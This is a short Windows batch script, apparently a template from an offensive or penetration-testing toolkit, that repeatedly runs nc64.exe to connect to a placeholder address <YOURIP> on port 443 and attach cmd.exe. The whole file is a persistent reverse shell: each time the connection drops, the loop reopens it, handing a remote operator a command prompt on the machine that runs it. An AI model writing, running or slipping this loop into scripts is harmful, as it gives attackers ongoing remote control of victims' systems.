  @echo off

cls
:start
.\nc64.exe <YOURIP> 443 -e cmd.exe
goto start